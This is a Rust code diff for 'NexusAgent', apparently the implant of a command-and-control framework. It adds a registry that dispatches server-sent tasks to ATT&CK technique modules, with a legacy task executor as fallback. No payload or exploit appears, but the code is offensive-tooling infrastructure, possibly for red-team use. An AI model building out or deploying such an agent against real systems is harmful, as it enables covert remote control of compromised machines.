@@ -1,6 +1,7 @@
 use nexus_common::*;
 use crate::communication::NetworkClient;
 use crate::execution::TaskExecutor;
+use crate::registry::TechniqueRegistry;
 use crate::system::SystemInfo;
 use std::sync::Arc;
 use std::time::Duration;
@@ -12,6 +13,7 @@ pub struct NexusAgent {
     crypto: Crypto,
     network_client: NetworkClient,
     task_executor: TaskExecutor,
+    technique_registry: TechniqueRegistry,
     system_info: SystemInfo,
     capabilities: Vec<String>,
     last_heartbeat: u64,
@@ -23,14 +25,17 @@ impl NexusAgent {
         let crypto = Crypto::new(encryption_key);
         let network_client = NetworkClient::new(server_addr.clone());
         let task_executor = TaskExecutor::new();
+        let technique_registry = TechniqueRegistry::build();
         let system_info = SystemInfo::collect().await?;
-        
+
         // Determine agent capabilities based on OS and compilation features
         let mut capabilities = vec![
-            "shell_execution".to_string(),
             "file_operations".to_string(),
             "network_operations".to_string(),
         ];
+
+        // Add capabilities from registered ATT&CK technique crates
+        capabilities.extend(technique_registry.capabilities());
 
         #[cfg(target_os = "windows")]
         {
@@ -56,6 +61,7 @@ impl NexusAgent {
             crypto,
             network_client,
             task_executor,
+            technique_registry,
             system_info,
             capabilities,
             last_heartbeat: 0,
@@ -160,11 +166,42 @@ impl NexusAgent {
         println!("Executing task: {} ({})", task_data.task_type, task_id);
 
         // Execute the task with timeout
+        // Try technique registry first; fall back to legacy TaskExecutor
         let task_timeout = task_data.timeout.unwrap_or(300);
-        let result = timeout(
-            Duration::from_secs(task_timeout),
-            self.task_executor.execute_task(task_data)
-        ).await;
+        let result = if self.technique_registry.has_technique(&task_data.task_type) {
+            let ctx = ExecutionContext {
+                crypto: Arc::new(self.crypto.clone()),
+                agent_id: self.id.clone().unwrap_or_default(),
+                platform: if cfg!(target_os = "windows") {
+                    Platform::Windows
+                } else {
+                    Platform::Linux
+                },
+            };
+            let params = TechniqueParams::from(&task_data);
+            let technique_result = timeout(
+                Duration::from_secs(task_timeout),
+                self.technique_registry.dispatch(&ctx, &task_data.task_type, params),
+            )
+            .await;
+            // Convert TechniqueResult -> Result<String> to match legacy path
+            match technique_result {
+                Ok(Ok(tr)) if tr.success => Ok(Ok(tr.output)),
+                Ok(Ok(tr)) => Ok(Err(NexusError::TaskExecutionError(
+                    tr.error.unwrap_or_default(),
+                ))),
+                Ok(Err(e)) => Ok(Err(e)),
+                Err(e) => Err(e),
+            }
+        } else {
+            // Legacy dispatch
+            timeout(
+                Duration::from_secs(task_timeout),
+                self.task_executor.execute_task(task_data),
+            )
+            .await
+            .map(|r| r.map(|output| output))
+        };
 
         let task_result = match result {
             Ok(Ok(output)) => {
